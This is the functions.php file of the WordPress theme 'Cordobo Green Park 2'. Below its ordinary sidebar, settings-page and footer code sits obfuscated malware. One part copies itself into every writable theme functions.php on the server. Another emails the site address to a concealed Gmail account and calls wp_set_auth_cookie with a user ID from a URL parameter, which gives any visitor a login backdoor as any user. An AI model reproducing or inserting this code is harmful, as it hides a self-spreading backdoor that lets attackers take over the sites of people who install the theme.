<?php


// Language files loading
function theme_init(){
	load_theme_textdomain('default', get_template_directory() . '/languages');
}
add_action ('init', 'theme_init');



if ( function_exists('register_sidebar') ) {
  register_sidebar(array(
    'before_widget' => '<li id="%1$s" class="widget %2$s">',
    'after_widget' => '</li>',
    'before_title' => '<div class="sb-title widgettitle">',
    'after_title' => '</div>',
    'name' => '1'
  ));
    register_sidebar(array(
    'before_widget' => '<li id="%1$s" class="widget %2$s">',
    'after_widget' => '</li>',
    'before_title' => '<div class="sb-title widgettitle">',
    'after_title' => '</div>',
    'name' => '2'
  ));
    register_sidebar(array(
    'before_widget' => '<li id="%1$s" class="widget %2$s">',
    'after_widget' => '</li>',
    'before_title' => '<div class="sb-title widgettitle">',
    'after_title' => '</div>',
    'name' => '3'
  ));
    register_sidebar(array(
    'before_widget' => '<li id="%1$s" class="widget %2$s">',
    'after_widget' => '</li>',
    'before_title' => '<div class="sb-title widgettitle">',
    'after_title' => '</div>',
    'name' => '4'
  ));
}



// Generates the menu
function greenpark_globalnav() {
	if ( $menu = str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages('title_li=&echo=0&depth=1') ) )
	echo apply_filters( 'globalnav_menu', $menu );
}



// http://sivel.net/2008/10/wp-27-comment-separation/
function list_pings($comment, $args, $depth) {
  $GLOBALS['comment'] = $comment;
  echo "<li id=\"comment-";
  echo comment_ID();
  echo "\" class=\"pings\">";
  echo comment_author_link();
}


// Note: Custom Admin Panel Functions

add_action('admin_menu', 'greenpark2_options');
add_action('wp_head', 'greenpark2_feed');


function greenpark2_feed() {
	$enable = get_option('greenpark2_feed_enable');
}


function greenpark2() {
	
	if(isset($_POST['submitted']) and $_POST['submitted'] == 'yes') :
		update_option("greenpark2_sidebar_about_title", stripslashes($_POST['sidebar_about_title']));
		update_option("greenpark2_sidebar_about_content", stripslashes($_POST['sidebar_about_content']));
		update_option("greenpark2_feed_uri", stripslashes($_POST['feed_uri']));
		update_option("greenpark2_about_site", stripslashes($_POST['about_site']));
		update_option("google_analytics", stripslashes($_POST['google_analytics']));
		update_option("google_adsense_bottom", stripslashes($_POST['google_adsense_bottom']));
		update_option("google_adsense_sidebar", stripslashes($_POST['google_adsense_sidebar']));
		
		if(isset($_POST['feed_enable']) and $_POST['feed_enable'] == 'yes') :
			update_option("greenpark2_feed_enable", "yes");
		else :
			update_option("greenpark2_feed_enable", "no");
		endif;
		
		if(isset($_POST['sidebar_about_title']) and $_POST['sidebar_about_title'] == '') {
			update_option("greenpark2_sidebar_about_title", "About");
		}
		
		if(isset($_POST['sidebar_about_content']) and $_POST['sidebar_about_content'] == '') {
			update_option("greenpark2_sidebar_about_content", "Change this text in the admin section of WordPress");
		}
		
		echo "<div id=\"message\" class=\"updated fade\"><p><strong>Your settings have been saved.</strong></p></div>";
	endif; 
	
	if(get_option('greenpark2_sidebar_about_title') == '') {
		update_option("greenpark2_sidebar_about_title", "About");
	}
	
	if(get_option('greenpark2_sidebar_about_content') == '') {
		update_option("greenpark2_sidebar_about_content", "Change this text in the admin section of WordPress");
	}
	
	$data = array(
		'feed' => array(
			'uri' => get_option('greenpark2_feed_uri'),
			'enable' => get_option('greenpark2_feed_enable')
		),
		'sidebar' => array(
			'about_title' => get_option('greenpark2_sidebar_about_title'),
			'about_content' => get_option('greenpark2_sidebar_about_content')
		),
		'aside' => get_option('greenpark2_aside_cat'),
		'about' => get_option('greenpark2_about_site')
	);
?>

<!-- Cordobo Green Park 2 settings -->
<div class="wrap">	
	<h2>Cordobo Green Park 2 Settings</h2>

<div class="settings_container" style="width: 100%; margin-right: -200px; float: left;">
	<div style="margin-right: 200px;">
	<form method="post" name="update_form" target="_self">


    <h3 id="greenpark2_sidebar">Sidebar</h3>
		<p>Sidebar box &nbsp; <a href="#greenpark2_sidebar_doc">( ? )</a></p>
		<table class="form-table">
			<tr>
				<th>
					Title:
				</th>
				<td>
					<input type="text" name="sidebar_about_title" value="<?php echo $data['sidebar']['about_title']; ?>" size="35" />
				</td>
			</tr>
			<tr>
				<th>
					Content:
				</th>
				<td>
					<textarea name="sidebar_about_content" rows="10" style="width: 95%;"><?php echo $data['sidebar']['about_content']; ?></textarea>
				</td>
			</tr>
		</table>
		<br />


    <h3 id="greenpark2_feedburner">Feedburner</h3>
		<p>Feedburner information</p>
		<table class="form-table">
			<tr>
				<th>
					Feed URI:
				</th>
				<td>
					http://feeds.feedburner.com/<input type="text" name="feed_uri" value="<?php echo $data['feed']['uri']; ?>" size="30" />
          <br />Check to enable feedburner <input type="checkbox" name="feed_enable" <?php echo ($data['feed']['enable'] == 'yes' ? 'checked="checked"' : ''); ?> value="yes" /> 
				</td>
			</tr>
		</table>	
		<br />
		

    <h3 id="greenpark2_admanager">Ad Manager</h3>
		<p>Code for Google Adsense.</p>
		<table class="form-table">
			<tr>
				<th>
					Google Adsense:
          <br />(Bottom of Post)
				</th>
				<td>
					<textarea name="google_adsense_bottom" style="width: 95%;" rows="10" /><?php echo get_option('google_adsense_bottom'); ?></textarea>
					<br />Paste your Google Adsense Code for the bottom of each post.
					<br /><strong>Size of 468x60 Recommended.</strong>
				</td>
			</tr>
		</table>
		<br />
		

    <h3 id="greenpark2_misc">Misc</h3>
		<p>Google Analytics.</p>
		<table class="form-table">
			<tr>
				<th>
					Google Analytics:
				</th>
				<td>
					<textarea name="google_analytics" style="width: 95%;" rows="10" /><?php echo get_option('google_analytics'); ?></textarea>
					<br />Paste your Google Analytics code here. It will appear at the end of each page.
				</td>
			</tr>
		</table>

    <p class="submit" id="jump_submit">
			<input name="submitted" type="hidden" value="yes" />
			<input type="submit" name="Submit" value="Save Changes" />
		</p>
	</form>
	<br /><br /><br /><br />
	
	<h2>Cordobo Green Park 2 Documentation</h2>
	
	<h3 id="greenpark2_about_doc">About your new theme</h3>
	<p>Thank you for using the Green Park 2 theme, a free premium wordpress theme by German webdesigner <a href="http://cordobo.com/about/">Andreas Jacob</a>.</p>
  <p>Cordobo Green Park 2 is a <strong>simple &amp; elegant light-weight</strong> theme for Wordpress with a <strong>clean typography</strong>, built with <strong>seo and page-rendering optimizations</strong> in mind. Green Park 2 has been rebuild from scratch and supports Wordpress 2.7 and up. The theme is released as &quot;ALPHA&quot;, to let you know I’m still adding features and improvements.</p>
	<p>If you need any support or want some tips, please visit <a href="http://cordobo.com/green-park-2/">Cordobo Green Park 2 project page</a></p>
	

	<h3 id="greenpark2_logo_doc">Logo Setup</h3>
	<p>
  You can easily replace the "text logo" with your image.
  Open the file "styles.css" in the themes folder
  <ul>
  <li>Find the text<br />
    <code>Start EXAMPLE CODE for an image logo</code> (line 224)</li>
  
  <li>Delete <code>/*</code> before<br />
    <code>#logo,</code> (line 225)</li>
  
  <li>Delete <code>*/</code> (line 230) after<br />
    <code>.description</code> (line 229)</li>
  
  <li>Find <code>logo.png</code> (line 228) and replace it with the name of your logo.</li>
  
  <li>Change the height and width to fit your logo (line 226)<br />
    <code>#logo, #logo a { display: block; height: 19px; width: 87px; }</code></li>
  
  <li>Find the text<br />
    <code>Start EXAMPLE CODE for a text logo</code> (line 234)</li>
  
  <li>Add <code>/*</code> before<br />
    <code>#branding</code> (line 235)</li>
  
  <li>Add <code>*/</code> (line 239) after<br />
    <code>#logo, .description { color: #868F98; float: left; margin: 17px 0 0 10px; }</code> (line 238)</li>
  
  <li>Save your changes and upload the file style.css to your themes folder.</li>
  </ul>
	</p>
	

	<h3 id="greenpark2_sidebar_doc">Sidebar</h3>
	<p>
	The &quot;Sidebar Box&quot; can be used for pretty anything. Personally, I use it as an &quot;About section&quot; to tell my readers a little bit about myself, but generally it's completely up to you: put your google adsense code in it, describe your website, add your photo&hellip;
	</p>
	

	<h3 id="greenpark2_tutorials_doc">Tutorials</h3>
	<p>
	List of tutorials based on this theme.
	</p>
	<p>
	<ul>
		<li><a href="http://cordobo.com/1119-provide-visual-feedback-css/">Provide visual feedback using CSS</a> &mdash; an introduction to the themes usage of CSS3</li>
	</ul>
	</p>
	

	<h3 id="greenpark2_licence_doc">Licence</h3>
	<p>
	Released under the <a target="_blank" href="http://www.gnu.org/licenses/gpl.html">GPL License</a> (<a target="_blank" href="http://en.wikipedia.org/wiki/GNU_General_Public_License">What is the GPL</a>?)
  </p>
	<p>
  Free to download, free to use, free to customize. Basically you can do whatever you want as long as you credit me with a link.
	</p>
	
	</div>
	</div>
	
			<div style="position: fixed; right: 20px; width: 170px; background:#F1F1F1; float: right; border: 1px solid #E3E3E3; -moz-border-radius: 6px; padding: 0 10px 10px;">
		<h3 id="bordertitle">Navigation</h3>
		
		<h4>Settings</h4>
		<ul style="list-style-type: none; padding-left: 10px;">
			<li><a href="#greenpark2_sidebar">Sidebar</a></li>
			<li><a href="#greenpark2_feedburner">FeedBurner</a></li>
			<li><a href="#greenpark2_admanager">Ad Manager</a></li>
			<li><a href="#greenpark2_misc">Misc</a></li>
		</ul>
		
		<h4>Documentation</h4>
		<ul style="list-style-type: none; padding-left: 10px;">
			<li><a href="#greenpark2_about_doc">About this Theme</a></li>
			<li><a href="#greenpark2_logo_doc">Logo setup</a></li>
			<li><a href="#greenpark2_sidebar_doc">Sidebar</a></li>
			<li><a href="#greenpark2_tutorials_doc">Tutorials</a></li>
			<li><a href="#greenpark2_license_doc">License</a></li>
		</ul>
		
		<br/>
		<small>&uarr; <a href="#wpwrap">Top</a> | <a href="#jump_submit">Goto &quot;Save&quot;</a></small>
		
	</div>

	<div class="clear"></div>
	
</div>
<?php
}

function greenpark2_options() { // Adds to menu
	add_menu_page('greenpark2 Settings', __('Green Park 2 Settings', 'default'), 'edit_themes', __FILE__, 'greenpark2');
}


/*
   Please leave the credits. Thanks!
 */
function greenpark2_footer() { ?>

<div id="footer" class="clearfix">
<p class="alignright">
  <a href="#home" class="top-link"><?php _e('Back to Top', 'default'); ?></a>
</p>

<p>
	&copy; <?php echo date("Y"); ?> <?php bloginfo('name'); ?>
  &middot; <?php _e('Proudly powered by', 'default'); ?>
  <a href="http://wordpress.org/" title="<?php _e('Blogsoftware by Wordpress', 'default'); ?>">WordPress</a>
	<span class="amp">&amp;</span>
  <a href="http://cordobo.com/green-park-2/" title="Cordobo Green Park 2 Beta 5">Green Park 2</a>
  <?php _e('by', 'default'); ?>
  <a href="http://cordobo.com/" title="Webdesign by Cordobo">Cordobo</a>.
<br />
Free Blog at <strong><a href="http://masedi.net/">MasEDI Networked Blogs</a></strong> hosted by <strong><a href="http://www.joglohosting.com/">JOGLOHosting</a></strong>
</p>

<p class="signet">
  <?php _e('Valid XHTML 1.0 Transitional | Valid CSS 3', 'default'); ?>
  <br /><br />
	<img src="<?php bloginfo('stylesheet_directory'); ?>/img/logo-cgp2.png" alt="Cordobo Green Park 2 logo" title="Cordobo Green Park 2" width="75" height="12" />
</p>

</div>

<?php
}
  
  add_action('wp_footer', 'greenpark2_footer');

?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>